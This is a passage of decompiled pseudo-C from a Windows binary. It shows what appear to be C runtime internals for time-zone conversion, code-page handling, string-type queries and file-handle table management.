  if (DAT_0042ed70 == 0) {
    FUN_00419b70(1,1,uVar7,4,1,0,0,2,0,0,0);
    uVar7 = param_1[5];
    uVar11 = 0;
    uVar3 = 0;
    uVar10 = 0;
    uVar4 = 2;
    uVar1 = 0;
    uVar9 = 5;
    uVar8 = 10;
LAB_00419ac8:
    uVar5 = 0;
    iVar6 = 1;
  }
  else {
    if (DAT_0042ee10 != 0) {
      uVar10 = (uint)DAT_0042ee14._2_2_;
      uVar3 = 0;
      uVar1 = 0;
    }
    else {
      uVar3 = DAT_0042ee14 & 0xffff;
      uVar10 = 0;
      uVar1 = (uint)DAT_0042ee14._2_2_;
    }
    FUN_00419b70(1,(uint)(DAT_0042ee10 == 0),uVar7,(uint)DAT_0042ee12,uVar1,uVar3,uVar10,
                 DAT_0042ee18 & 0xffff,DAT_0042ee18 >> 0x10,DAT_0042ee1c & 0xffff,
                 DAT_0042ee1c >> 0x10);
    if (DAT_0042edbc == 0) {
      uVar11 = (uint)DAT_0042edc8._2_2_;
      uVar3 = DAT_0042edc8 & 0xffff;
      uVar10 = (uint)DAT_0042edc4._2_2_;
      uVar4 = DAT_0042edc4 & 0xffff;
      uVar1 = DAT_0042edc0 & 0xffff;
      uVar9 = (uint)DAT_0042edc0._2_2_;
      uVar8 = (uint)DAT_0042edbe;
      uVar7 = param_1[5];
      goto LAB_00419ac8;
    }
    uVar11 = (uint)DAT_0042edc8._2_2_;
    uVar3 = DAT_0042edc8 & 0xffff;
    uVar10 = (uint)DAT_0042edc4._2_2_;
    uVar5 = (uint)DAT_0042edc0._2_2_;
    uVar4 = DAT_0042edc4 & 0xffff;
    uVar7 = param_1[5];
    uVar8 = (uint)DAT_0042edbe;
    uVar1 = 0;
    uVar9 = 0;
    iVar6 = 0;
  }
  FUN_00419b70(0,iVar6,uVar7,uVar8,uVar9,uVar1,uVar5,uVar4,uVar10,uVar3,uVar11);
LAB_00419ad4:
  iVar6 = param_1[7];
  if (DAT_0042d4e4 < DAT_0042d4f4) {
    if ((iVar6 < DAT_0042d4e4) || (DAT_0042d4f4 < iVar6)) {
      return false;
    }
    if ((DAT_0042d4e4 < iVar6) && (iVar6 < DAT_0042d4f4)) {
      return true;
    }
  }
  else {
    if ((iVar6 < DAT_0042d4f4) || (DAT_0042d4e4 < iVar6)) {
      return true;
    }
    if ((DAT_0042d4f4 < iVar6) && (iVar6 < DAT_0042d4e4)) {
      return false;
    }
  }
  iVar2 = (*param_1 + (param_1[1] + param_1[2] * 0x3c) * 0x3c) * 1000;
  if (iVar6 != DAT_0042d4e4) {
    return iVar2 < DAT_0042d4f8;
  }
  return DAT_0042d4e8 <= iVar2;
}



/* VA 00419b70 */

void __cdecl
FUN_00419b70(int param_1,int param_2,uint param_3,int param_4,int param_5,int param_6,int param_7,
            int param_8,int param_9,int param_10,int param_11)

{
  undefined *puVar1;
  int iVar2;

  if (param_2 == 1) {
    if ((param_3 & 3) == 0) {
      puVar1 = (&PTR_FUN_0042df4c)[param_4];
    }
    else {
      puVar1 = *(undefined **)(&DAT_0042df84 + param_4 * 4);
    }
    iVar2 = (int)(puVar1 + ((int)(param_3 - 1) >> 2) + param_3 * 0x16d + -0x63da) % 7;
    if (iVar2 < param_6) {
      iVar2 = (param_5 * 7 - iVar2) + param_6 + -6;
    }
    else {
      iVar2 = (param_5 * 7 - iVar2) + param_6 + 1;
    }
    puVar1 = puVar1 + iVar2;
    if (param_5 == 5) {
      if ((param_3 & 3) == 0) {
        iVar2 = *(int *)(&DAT_0042df50 + param_4 * 4);
      }
      else {
        iVar2 = (&DAT_0042df88)[param_4];
      }
      if (iVar2 < (int)puVar1) {
        puVar1 = puVar1 + -7;
      }
    }
  }
  else {
    if ((param_3 & 3) == 0) {
      puVar1 = (&PTR_FUN_0042df4c)[param_4];
    }
    else {
      puVar1 = *(undefined **)(&DAT_0042df84 + param_4 * 4);
    }
    puVar1 = puVar1 + param_7;
  }
  if (param_1 == 1) {
    DAT_0042d4e4 = puVar1;
    DAT_0042d4e0 = param_3;
    DAT_0042d4e8 = param_11 + (param_10 + (param_9 + param_8 * 0x3c) * 0x3c) * 1000;
    return;
  }
  DAT_0042d4f4 = puVar1;
  DAT_0042d4f8 = param_11 + (param_10 + (param_9 + param_8 * 0x3c) * 0x3c + DAT_0042d448) * 1000;
  if (DAT_0042d4f8 < 0) {
    DAT_0042d4f0 = param_3;
    DAT_0042d4f8 = DAT_0042d4f8 + 86399999;
    return;
  }
  if (86399999 < DAT_0042d4f8) {
    DAT_0042d4f8 = DAT_0042d4f8 + -86399999;
  }
  DAT_0042d4f0 = param_3;
  return;
}



/* VA 00419d10 */

int * __cdecl FUN_00419d10(int *param_1)

{
  bool bVar1;
  DWORD *pDVar2;
  DWORD DVar3;
  int iVar4;
  int *piVar5;
  int *piVar6;
  undefined4 *puVar7;
  int iVar8;
  int iVar9;
  int iVar10;

  bVar1 = false;
  iVar10 = *param_1;
  pDVar2 = FUN_00419530();
  if (iVar10 < 0) {
    return (int *)0x0;
  }
  if (pDVar2[0x10] == 0) {
    DVar3 = FUN_00414db0(0x24);
    pDVar2[0x10] = DVar3;
    piVar5 = (int *)&DAT_0042ee30;
    if (DVar3 == 0) goto LAB_00419d4f;
  }
  piVar5 = (int *)pDVar2[0x10];
LAB_00419d4f:
  iVar8 = iVar10 % 0x7861f80;
  iVar10 = (iVar10 / 0x7861f80) * 4;
  iVar4 = iVar10 + 0x46;
  iVar9 = iVar8;
  if (0x1e1337f < iVar8) {
    iVar9 = iVar8 + -0x1e13380;
    iVar4 = iVar10 + 0x47;
    if (0x1e1337f < iVar9) {
      iVar9 = iVar8 + -0x3c26700;
      iVar4 = iVar10 + 0x48;
      if (iVar9 < 0x1e28500) {
        bVar1 = true;
      }
      else {
        iVar4 = iVar10 + 0x49;
        iVar9 = iVar8 + -0x5a4ec00;
      }
    }
  }
  piVar5[5] = iVar4;
  piVar5[7] = iVar9 / 0x15180;
  puVar7 = (undefined4 *)&DAT_0042df50;
  if (!bVar1) {
    puVar7 = &DAT_0042df88;
  }
  piVar6 = puVar7 + 1;
  iVar4 = 1;
  iVar10 = *piVar6;
  while (iVar10 < piVar5[7]) {
    piVar6 = piVar6 + 1;
    iVar4 = iVar4 + 1;
    iVar10 = *piVar6;
  }
  piVar5[4] = iVar4 + -1;
  piVar5[3] = piVar5[7] - puVar7[iVar4 + -1];
  iVar10 = *param_1;
  piVar5[8] = 0;
  piVar5[6] = (iVar10 / 0x15180 + 4) % 7;
  piVar5[2] = (iVar9 % 0x15180) / 0xe10;
  iVar10 = (iVar9 % 0x15180) % 0xe10;
  piVar5[1] = iVar10 / 0x3c;
  *piVar5 = iVar10 % 0x3c;
  return piVar5;
}



/* VA 0041a050 */

undefined4 * FUN_0041a050(void)

{
  int iVar1;
  undefined4 uVar2;
  int iVar3;
  undefined4 *puVar4;

  puVar4 = (undefined4 *)0x0;
  FUN_00417120(2);
  iVar3 = 0;
  if (0 < DAT_004313a0) {
    do {
      iVar1 = *(int *)(DAT_00430384 + iVar3 * 4);
      if (iVar1 == 0) {
        iVar3 = iVar3 * 4;
        uVar2 = FUN_00414db0(0x38);
        *(undefined4 *)(DAT_00430384 + iVar3) = uVar2;
        if (*(int *)(DAT_00430384 + iVar3) != 0) {
          InitializeCriticalSection((LPCRITICAL_SECTION)(*(int *)(DAT_00430384 + iVar3) + 0x20));
          EnterCriticalSection((LPCRITICAL_SECTION)(*(int *)(DAT_00430384 + iVar3) + 0x20));
          puVar4 = *(undefined4 **)(DAT_00430384 + iVar3);
        }
        break;
      }
      if ((*(byte *)(iVar1 + 0xc) & 0x83) == 0) {
        FUN_00417200(iVar3,iVar1);
        iVar1 = *(int *)(DAT_00430384 + iVar3 * 4);
        if ((*(byte *)(iVar1 + 0xc) & 0x83) == 0) {
          puVar4 = *(undefined4 **)(DAT_00430384 + iVar3 * 4);
          break;
        }
        FUN_00417270(iVar3,iVar1);
      }
      iVar3 = iVar3 + 1;
    } while (iVar3 < DAT_004313a0);
  }
  if (puVar4 != (undefined4 *)0x0) {
    puVar4[1] = 0;
    puVar4[3] = 0;
    puVar4[2] = 0;
    *puVar4 = 0;
    puVar4[7] = 0;
    puVar4[4] = 0xffffffff;
  }
  FUN_004171a0(2);
  return puVar4;
}



/* VA 0041a130 */

BOOL __cdecl
FUN_0041a130(DWORD param_1,LPCWSTR param_2,int param_3,LPWORD param_4,UINT param_5,LCID param_6)

{
  BOOL BVar1;
  int cbMultiByte;
  int *lpMultiByteStr;
  int iVar2;
  LPWORD lpCharType;
  BOOL local_4;

  lpCharType = (LPWORD)0x0;
  if (DAT_0042ee54 == 0) {
    BVar1 = GetStringTypeW(1,L"",1,(LPWORD)&local_4);
    if (BVar1 == 0) {
      BVar1 = GetStringTypeA(0,1,"",1,(LPWORD)&local_4);
      if (BVar1 == 0) {
        return 0;
      }
      DAT_0042ee54 = 2;
    }
    else {
      DAT_0042ee54 = 1;
    }
  }
  if (DAT_0042ee54 != 1) {
    local_4 = DAT_0042ee54;
    if (DAT_0042ee54 == 2) {
      local_4 = 0;
      if (param_5 == 0) {
        param_5 = DAT_0042ed60;
      }
      cbMultiByte = WideCharToMultiByte(param_5,0x220,param_2,param_3,(LPSTR)0x0,0,(LPCSTR)0x0,
                                        (LPBOOL)0x0);
      if (cbMultiByte == 0) {
        return 0;
      }
      lpMultiByteStr = FUN_0041d0f0(1,cbMultiByte);
      if (lpMultiByteStr == (int *)0x0) {
        return 0;
      }
      iVar2 = WideCharToMultiByte(param_5,0x220,param_2,param_3,(LPSTR)lpMultiByteStr,cbMultiByte,
                                  (LPCSTR)0x0,(LPBOOL)0x0);
      if ((iVar2 != 0) &&
         (lpCharType = (LPWORD)FUN_00414db0(cbMultiByte * 2 + 2), lpCharType != (LPWORD)0x0)) {
        if (param_6 == 0) {
          param_6 = DAT_0042ed50;
        }
        lpCharType[param_3] = 0xffff;
        lpCharType[param_3 + -1] = 0xffff;
        local_4 = GetStringTypeA(param_6,param_1,(LPCSTR)lpMultiByteStr,cbMultiByte,lpCharType);
        if ((lpCharType[param_3 + -1] == 0xffff) || (lpCharType[param_3] != 0xffff)) {
          local_4 = 0;
        }
        else {
          FUN_0041d580((undefined4 *)param_4,(undefined4 *)lpCharType,param_3 * 2);
        }
      }
      FUN_00414d40((undefined *)lpMultiByteStr);
      FUN_00414d40((undefined *)lpCharType);
    }
    return local_4;
  }
  BVar1 = GetStringTypeW(param_1,param_2,param_3,param_4);
  return BVar1;
}



/* VA 0041a2c0 */

BOOL __cdecl
FUN_0041a2c0(DWORD param_1,LPCSTR param_2,int param_3,LPWORD param_4,UINT param_5,LCID param_6)

{
  BOOL BVar1;
  int iVar2;
  LPCWSTR lpWideCharStr;
  WORD local_2;

  lpWideCharStr = (LPCWSTR)0x0;
  if (DAT_0042ee58 == 0) {
    BVar1 = GetStringTypeA(0,1,"",1,&local_2);
    if (BVar1 == 0) {
      BVar1 = GetStringTypeW(1,L"",1,&local_2);
      if (BVar1 == 0) {
        return 0;
      }
      DAT_0042ee58 = 1;
    }
    else {
      DAT_0042ee58 = 2;
    }
  }
  if (DAT_0042ee58 == 2) {
    if (param_6 == 0) {
      param_6 = DAT_0042ed50;
    }
    BVar1 = GetStringTypeA(param_6,param_1,param_2,param_3,param_4);
    return BVar1;
  }
  param_6 = DAT_0042ee58;
  if (DAT_0042ee58 == 1) {
    param_6 = 0;
    if (param_5 == 0) {
      param_5 = DAT_0042ed60;
    }
    iVar2 = MultiByteToWideChar(param_5,9,param_2,param_3,(LPWSTR)0x0,0);
    if (iVar2 != 0) {
      lpWideCharStr = (LPCWSTR)FUN_0041d0f0(2,iVar2);
      if (lpWideCharStr != (LPCWSTR)0x0) {
        iVar2 = MultiByteToWideChar(param_5,1,param_2,param_3,lpWideCharStr,iVar2);
        if (iVar2 != 0) {
          BVar1 = GetStringTypeW(param_1,lpWideCharStr,iVar2,param_4);
          FUN_00414d40((undefined *)lpWideCharStr);
          return BVar1;
        }
      }
    }
    FUN_00414d40((undefined *)lpWideCharStr);
  }
  return param_6;
}



/* VA 0041a3f0 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined4 __cdecl FUN_0041a3f0(int param_1)

{
  BYTE *pBVar1;
  byte *pbVar2;
  byte bVar3;
  byte bVar4;
  UINT CodePage;
  UINT *pUVar5;
  BOOL BVar6;
  uint uVar7;
  uint uVar8;
  int iVar9;
  int iVar10;
  BYTE *pBVar11;
  byte *pbVar12;
  byte *pbVar13;
  undefined4 *puVar14;
  _cpinfo local_14;

  FUN_00417120(0x19);
  CodePage = FUN_0041a610(param_1);
  if (CodePage == DAT_0042ef64) {
    FUN_004171a0(0x19);
    return 0;
  }
  if (CodePage != 0) {
    iVar10 = 0;
    pUVar5 = &DAT_0042d508;
    do {
      if (*pUVar5 == CodePage) {
        puVar14 = &DAT_0042ee60;
        for (iVar9 = 0x40; iVar9 != 0; iVar9 = iVar9 + -1) {
          *puVar14 = 0;
          puVar14 = puVar14 + 1;
        }
        *(undefined1 *)puVar14 = 0;
        uVar7 = 0;
        iVar10 = iVar10 * 0x30;
        pbVar12 = (byte *)(iVar10 + 0x42d518);
        do {
          bVar3 = *pbVar12;
          for (pbVar13 = pbVar12; (bVar3 != 0 && (bVar3 = pbVar13[1], bVar3 != 0));
              pbVar13 = pbVar13 + 2) {
            uVar8 = (uint)*pbVar13;
            if (uVar8 <= bVar3) {
              bVar4 = (&DAT_0042d500)[uVar7];
              do {
                pbVar2 = (byte *)((int)&DAT_0042ee60 + uVar8 + 1);
                *pbVar2 = *pbVar2 | bVar4;
                uVar8 = uVar8 + 1;
              } while (uVar8 <= bVar3);
            }
            bVar3 = pbVar13[2];
          }
          uVar7 = uVar7 + 1;
          pbVar12 = pbVar12 + 8;
        } while (uVar7 < 4);
        DAT_0042ef64 = CodePage;
        DAT_0042ef68 = FUN_0041a660(CodePage);
        _DAT_0042ef70 = *(undefined4 *)(iVar10 + 0x42d50c);
        _DAT_0042ef74 = *(undefined4 *)(iVar10 + 0x42d510);
        _DAT_0042ef78 = *(undefined4 *)(iVar10 + 0x42d514);
        FUN_004171a0(0x19);
        return 0;
      }
      pUVar5 = pUVar5 + 0xc;
      iVar10 = iVar10 + 1;
    } while (pUVar5 < &DAT_0042d5f8);
    BVar6 = GetCPInfo(CodePage,&local_14);
    if (BVar6 == 1) {
      puVar14 = &DAT_0042ee60;
      for (iVar10 = 0x40; iVar10 != 0; iVar10 = iVar10 + -1) {
        *puVar14 = 0;
        puVar14 = puVar14 + 1;
      }
      *(undefined1 *)puVar14 = 0;
      if (local_14.MaxCharSize < 2) {
        DAT_0042ef64 = 0;
        DAT_0042ef68 = 0;
      }
      else {
        if (local_14.LeadByte[0] != '\0') {
          pBVar11 = local_14.LeadByte + 1;
          do {
            bVar3 = *pBVar11;
            if (bVar3 == 0) break;
            for (uVar7 = (uint)pBVar11[-1]; uVar7 <= bVar3; uVar7 = uVar7 + 1) {
              *(byte *)((int)&DAT_0042ee60 + uVar7 + 1) =
                   *(byte *)((int)&DAT_0042ee60 + uVar7 + 1) | 4;
            }
            pBVar1 = pBVar11 + 1;
            pBVar11 = pBVar11 + 2;
          } while (*pBVar1 != 0);
        }
        uVar7 = 1;
        do {
          *(byte *)((int)&DAT_0042ee60 + uVar7 + 1) = *(byte *)((int)&DAT_0042ee60 + uVar7 + 1) | 8;
          uVar7 = uVar7 + 1;
        } while (uVar7 < 0xff);
        DAT_0042ef64 = CodePage;
        DAT_0042ef68 = FUN_0041a660(CodePage);
      }
      _DAT_0042ef70 = 0;
      _DAT_0042ef74 = 0;
      _DAT_0042ef78 = 0;
      FUN_004171a0(0x19);
      return 0;
    }
    if (DAT_0042ef7c == 0) {
      FUN_004171a0(0x19);
      return 0xffffffff;
    }
  }
  FUN_0041a6c0();
  FUN_004171a0(0x19);
  return 0;
}



/* VA 0041a610 */

int __cdecl FUN_0041a610(int param_1)

{
  int iVar1;
  bool bVar2;

  if (param_1 == -2) {
    DAT_0042ef7c = 1;
                    /* WARNING: Could not recover jumptable at 0x0041a62d. Too many branches */
                    /* WARNING: Treating indirect jump as call */
    iVar1 = GetOEMCP();
    return iVar1;
  }
  if (param_1 == -3) {
    DAT_0042ef7c = 1;
                    /* WARNING: Could not recover jumptable at 0x0041a642. Too many branches */
                    /* WARNING: Treating indirect jump as call */
    iVar1 = GetACP();
    return iVar1;
  }
  bVar2 = param_1 == -4;
  if (bVar2) {
    param_1 = DAT_0042ed60;
  }
  DAT_0042ef7c = (uint)bVar2;
  return param_1;
}



/* VA 0041a660 */

undefined4 __cdecl FUN_0041a660(undefined4 param_1)

{
  switch(param_1) {
  case 0x3a4:
    return 0x411;
  default:
    return 0;
  case 0x3a8:
    return 0x804;
  case 0x3b5:
    return 0x412;
  case 0x3b6:
    return 0x404;
  }
}



/* VA 0041a6c0 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_0041a6c0(void)

{
  int iVar1;
  undefined4 *puVar2;

  puVar2 = &DAT_0042ee60;
  for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  *(undefined1 *)puVar2 = 0;
  DAT_0042ef64 = 0;
  DAT_0042ef68 = 0;
  _DAT_0042ef70 = 0;
  _DAT_0042ef74 = 0;
  _DAT_0042ef78 = 0;
  return;
}



/* VA 0041a6f0 */

void FUN_0041a6f0(void)

{
  FUN_0041a3f0(-3);
  return;
}



/* VA 0041a700 */

byte * __cdecl FUN_0041a700(byte *param_1,byte *param_2,uint param_3)

{
  byte bVar1;
  byte bVar2;
  byte *pbVar3;
  uint uVar4;
  uint uVar5;
  byte *pbVar6;

  if (DAT_0042ef64 == 0) {
    pbVar3 = (byte *)_strncpy((char *)param_1,(char *)param_2,param_3);
    return pbVar3;
  }
  FUN_00417120(0x19);
  uVar5 = 0;
  pbVar3 = param_1;
  pbVar6 = param_1;
  if (param_3 != 0) {
    do {
      bVar1 = *param_2;
      uVar5 = param_3 - 1;
      bVar2 = *(byte *)((int)&DAT_0042ee60 + bVar1 + 1);
      *pbVar6 = bVar1;
      if ((bVar2 & 4) == 0) {
        pbVar3 = pbVar6 + 1;
        param_2 = param_2 + 1;
        if (bVar1 == 0) goto LAB_0041a77d;
      }
      else {
        pbVar3 = pbVar6 + 1;
        if (uVar5 == 0) {
          *pbVar6 = 0;
          goto LAB_0041a77d;
        }
        bVar1 = param_2[1];
        uVar5 = param_3 - 2;
        *pbVar3 = bVar1;
        pbVar3 = pbVar6 + 2;
        param_2 = param_2 + 2;
        if (bVar1 == 0) {
          *pbVar6 = 0;
          goto LAB_0041a77d;
        }
      }
      param_3 = uVar5;
      pbVar6 = pbVar3;
    } while (uVar5 != 0);
    uVar5 = 0;
  }
LAB_0041a77d:
  if (uVar5 != 0) {
    for (uVar4 = uVar5 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {
      pbVar3[0] = 0;
      pbVar3[1] = 0;
      pbVar3[2] = 0;
      pbVar3[3] = 0;
      pbVar3 = pbVar3 + 4;
    }
    for (uVar5 = uVar5 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {
      *pbVar3 = 0;
      pbVar3 = pbVar3 + 1;
    }
  }
  FUN_004171a0(0x19);
  return param_1;
}



/* VA 0041a840 */

uint FUN_0041a840(void)

{
  undefined4 *puVar1;
  int iVar2;
  int *piVar3;
  uint local_8;
  int local_4;

  local_8 = 0xffffffff;
  FUN_00417120(0x12);
  local_4 = 0;
  iVar2 = 0;
  piVar3 = &DAT_00430280;
  do {
    puVar1 = (undefined4 *)*piVar3;
    if (puVar1 == (undefined4 *)0x0) {
      puVar1 = (undefined4 *)FUN_00414db0(0x480);
      if (puVar1 != (undefined4 *)0x0) {
        DAT_00430380 = DAT_00430380 + 0x20;
        (&DAT_00430280)[local_4] = puVar1;
        if (puVar1 < puVar1 + 0x120) {
          do {
            *(undefined1 *)(puVar1 + 1) = 0;
            *puVar1 = 0xffffffff;
            *(undefined1 *)((int)puVar1 + 5) = 10;
            puVar1[2] = 0;
            puVar1 = puVar1 + 9;
          } while (puVar1 < (undefined4 *)((&DAT_00430280)[local_4] + 0x480));
        }
        local_8 = local_4 << 5;
        FUN_0041ab50(local_8);
      }
      break;
    }
    if (puVar1 < puVar1 + 0x120) {
      do {
        if ((*(byte *)(puVar1 + 1) & 1) == 0) {
          if (puVar1[2] == 0) {
            FUN_00417120(0x11);
            if (puVar1[2] == 0) {
              InitializeCriticalSection((LPCRITICAL_SECTION)(puVar1 + 3));
              puVar1[2] = puVar1[2] + 1;
            }
            FUN_004171a0(0x11);
          }
          EnterCriticalSection((LPCRITICAL_SECTION)(puVar1 + 3));
          if ((*(byte *)(puVar1 + 1) & 1) == 0) {
            *puVar1 = 0xffffffff;
            local_8 = ((int)puVar1 - *piVar3) / 0x24 + iVar2;
            break;
          }
          LeaveCriticalSection((LPCRITICAL_SECTION)(puVar1 + 3));
        }
        puVar1 = puVar1 + 9;
      } while (puVar1 < (undefined4 *)(*piVar3 + 0x480));
    }
    if (local_8 != 0xffffffff) break;
    piVar3 = piVar3 + 1;
    local_4 = local_4 + 1;
    iVar2 = iVar2 + 0x20;
  } while ((int)piVar3 < 0x430380);
  FUN_004171a0(0x12);
  return local_8;
}



/* VA 0041a9b0 */

undefined4 __cdecl FUN_0041a9b0(uint param_1,HANDLE param_2)

{
  DWORD *pDVar1;
  int iVar2;

  if (param_1 < DAT_00430380) {
    iVar2 = (param_1 & 0x1f) * 0x24;
    if (*(int *)((&DAT_00430280)[(int)param_1 >> 5] + iVar2) == -1) {
      if (DAT_0042ade4 == 1) {
        if (param_1 == 0) {
          SetStdHandle(0xfffffff6,param_2);
        }
        else {
          if (param_1 == 1) {
            SetStdHandle(0xfffffff5,param_2);
            *(HANDLE *)(DAT_00430280 + 0x24) = param_2;
            return 0;
          }
          if (param_1 == 2) {
            SetStdHandle(0xfffffff4,param_2);
            *(HANDLE *)(DAT_00430280 + 0x48) = param_2;
            return 0;
          }
        }
      }
      *(HANDLE *)((&DAT_00430280)[(int)param_1 >> 5] + iVar2) = param_2;
      return 0;
    }
  }
  pDVar1 = FUN_00419020();
  *pDVar1 = 9;
  pDVar1 = FUN_00419030();
  *pDVar1 = 0;
  return 0xffffffff;
}



/* VA 0041aa60 */

undefined4 __cdecl FUN_0041aa60(uint param_1)

{
  int iVar1;
  DWORD *pDVar2;
  int iVar3;
  DWORD nStdHandle;

  if (param_1 < DAT_00430380) {
    iVar1 = (&DAT_00430280)[(int)param_1 >> 5];
    iVar3 = (param_1 & 0x1f) * 0x24;
    if (((*(byte *)(iVar1 + 4 + iVar3) & 1) != 0) && (*(int *)(iVar1 + iVar3) != -1)) {
      if (DAT_0042ade4 == 1) {
        if (param_1 == 0) {
          nStdHandle = 0xfffffff6;
        }
        else if (param_1 == 1) {
          nStdHandle = 0xfffffff5;
        }
        else {
          if (param_1 != 2) goto LAB_0041aac7;
          nStdHandle = 0xfffffff4;
        }
        SetStdHandle(nStdHandle,(HANDLE)0x0);
      }
LAB_0041aac7:
      *(undefined4 *)((&DAT_00430280)[(int)param_1 >> 5] + iVar3) = 0xffffffff;
      return 0;
    }
  }
  pDVar2 = FUN_00419020();
  *pDVar2 = 9;
  pDVar2 = FUN_00419030();
  *pDVar2 = 0;
  return 0xffffffff;
}



/* VA 0041ab00 */

undefined4 __cdecl FUN_0041ab00(uint param_1)

{
  DWORD *pDVar1;

  if ((param_1 < DAT_00430380) &&
     ((*(byte *)((&DAT_00430280)[(int)param_1 >> 5] + 4 + (param_1 & 0x1f) * 0x24) & 1) != 0)) {
    return *(undefined4 *)((&DAT_00430280)[(int)param_1 >> 5] + (param_1 & 0x1f) * 0x24);
  }
  pDVar1 = FUN_00419020();
  *pDVar1 = 9;
  pDVar1 = FUN_00419030();
  *pDVar1 = 0;
  return 0xffffffff;
}



/* VA 0041ab50 */

void __cdecl FUN_0041ab50(uint param_1)

{
  int iVar1;
  int iVar2;

  iVar2 = (param_1 & 0x1f) * 0x24;
  iVar1 = (&DAT_00430280)[(int)param_1 >> 5] + iVar2;
  if (*(int *)(iVar1 + 8) == 0) {
    FUN_00417120(0x11);
    if (*(int *)(iVar1 + 8) == 0) {
      InitializeCriticalSection((LPCRITICAL_SECTION)(iVar1 + 0xc));
      *(int *)(iVar1 + 8) = *(int *)(iVar1 + 8) + 1;
    }
    FUN_004171a0(0x11);
  }
  EnterCriticalSection((LPCRITICAL_SECTION)((&DAT_00430280)[(int)param_1 >> 5] + 0xc + iVar2));
  return;
}



/* VA 0041abc0 */

void __cdecl FUN_0041abc0(uint param_1)

{
  LeaveCriticalSection
            ((LPCRITICAL_SECTION)
             ((&DAT_00430280)[(int)param_1 >> 5] + 0xc + (param_1 & 0x1f) * 0x24));
  return;
}



/* VA 0041abf0 */

void FUN_0041abf0(void)

{
  byte bVar1;
  undefined4 *puVar2;
  DWORD DVar3;
  HANDLE hFile;
  byte *pbVar4;
  int iVar5;
  int *piVar6;
  uint uVar7;
  UINT *pUVar8;
  UINT local_48;
  _STARTUPINFOA local_44;

  puVar2 = (undefined4 *)FUN_00414db0(0x480);
  if (puVar2 == (undefined4 *)0x0) {
    __amsg_exit(0x1b);
  }
  DAT_00430380 = 0x20;
  DAT_00430280 = puVar2;
  if (puVar2 < puVar2 + 0x120) {
    do {
      *(undefined1 *)(puVar2 + 1) = 0;
      *puVar2 = 0xffffffff;
      *(undefined1 *)((int)puVar2 + 5) = 10;
      puVar2[2] = 0;
      puVar2 = puVar2 + 9;
    } while (puVar2 < DAT_00430280 + 0x120);
  }
  GetStartupInfoA(&local_44);
  if ((local_44.cbReserved2 != 0) && ((UINT *)local_44.lpReserved2 != (UINT *)0x0)) {
    local_48 = *(UINT *)local_44.lpReserved2;
    pUVar8 = (UINT *)((int)local_44.lpReserved2 + 4);
    pbVar4 = (byte *)((int)pUVar8 + local_48);
    if (0x7ff < (int)local_48) {
      local_48 = 0x800;
    }
    if ((int)DAT_00430380 < (int)local_48) {
      piVar6 = &DAT_00430284;
      do {
        puVar2 = (undefined4 *)FUN_00414db0(0x480);
        if (puVar2 == (undefined4 *)0x0) {
          local_48 = DAT_00430380;
          break;
        }
        *piVar6 = (int)puVar2;
        DAT_00430380 = DAT_00430380 + 0x20;
        if (puVar2 < puVar2 + 0x120) {
          do {
            *(undefined1 *)(puVar2 + 1) = 0;
            *puVar2 = 0xffffffff;
            *(undefined1 *)((int)puVar2 + 5) = 10;
            puVar2[2] = 0;
            puVar2 = puVar2 + 9;
          } while (puVar2 < (undefined4 *)(*piVar6 + 0x480));
        }
        piVar6 = piVar6 + 1;
      } while ((int)DAT_00430380 < (int)local_48);
    }
    uVar7 = 0;
    if (0 < (int)local_48) {
      do {
        if (((*(HANDLE *)pbVar4 != (HANDLE)0xffffffff) && ((*pUVar8 & 1) != 0)) &&
           (((*pUVar8 & 8) != 0 || (DVar3 = GetFileType(*(HANDLE *)pbVar4), DVar3 != 0)))) {
          puVar2 = (undefined4 *)((int)(&DAT_00430280)[(int)uVar7 >> 5] + (uVar7 & 0x1f) * 0x24);
          *puVar2 = *(undefined4 *)pbVar4;
          *(byte *)(puVar2 + 1) = (byte)*pUVar8;
        }
        uVar7 = uVar7 + 1;
        pUVar8 = (UINT *)((int)pUVar8 + 1);
        pbVar4 = pbVar4 + 4;
      } while ((int)uVar7 < (int)local_48);
    }
  }
  iVar5 = 0;
  do {
    puVar2 = DAT_00430280 + iVar5 * 9;
    if (DAT_00430280[iVar5 * 9] == -1) {
      *(undefined1 *)(puVar2 + 1) = 0x81;
      if (iVar5 == 0) {
        DVar3 = 0xfffffff6;
      }
      else {
        DVar3 = 0xfffffff5 - (iVar5 != 1);
      }
      hFile = GetStdHandle(DVar3);
      if ((hFile == (HANDLE)0xffffffff) || (DVar3 = GetFileType(hFile), DVar3 == 0)) {
        bVar1 = *(byte *)(puVar2 + 1) | 0x40;
        goto LAB_0041adde;
      }
      *puVar2 = hFile;
      if ((DVar3 & 0xff) == 2) {
        bVar1 = *(byte *)(puVar2 + 1) | 0x40;
        goto LAB_0041adde;
      }
      if ((DVar3 & 0xff) == 3) {
        bVar1 = *(byte *)(puVar2 + 1) | 8;
        goto LAB_0041adde;
      }
    }
    else {
      bVar1 = *(byte *)(puVar2 + 1) | 0x80;
LAB_0041adde:
      *(byte *)(puVar2 + 1) = bVar1;
    }
    iVar5 = iVar5 + 1;
    if (2 < iVar5) {
      SetHandleCount(DAT_00430380);
      return;
    }
  } while( true );
}



/* VA 0041ae00 */

int FUN_0041ae00(void)

{
  DWORD DVar1;
  DWORD DVar2;
  uint uVar3;
  int iVar4;
  DWORD *pDVar5;
  HANDLE hFile;
  BOOL BVar6;
  int iVar7;
  int iVar8;
  uint uVar9;
  undefined4 *puVar10;
  uint in_stack_00001008;
  int in_stack_0000100c;

  FUN_004159a0();
  iVar8 = 0;
  DVar1 = FUN_004190c0(in_stack_00001008,0,1);
  if ((DVar1 == 0xffffffff) || (DVar2 = FUN_004190c0(in_stack_00001008,0,2), DVar2 == 0xffffffff)) {
    return -1;
  }
  uVar9 = in_stack_0000100c - DVar2;
  if ((int)uVar9 < 1) {
    if ((int)uVar9 < 0) {
      FUN_004190c0(in_stack_00001008,in_stack_0000100c,0);
      hFile = (HANDLE)FUN_0041ab00(in_stack_00001008);
      BVar6 = SetEndOfFile(hFile);
      iVar8 = (BVar6 != 0) - 1;
      if (iVar8 == -1) {
        pDVar5 = FUN_00419020();
        *pDVar5 = 0xd;
        DVar2 = GetLastError();
        pDVar5 = FUN_00419030();
        *pDVar5 = DVar2;
      }
    }
    FUN_004190c0(in_stack_00001008,DVar1,0);
    return iVar8;
  }
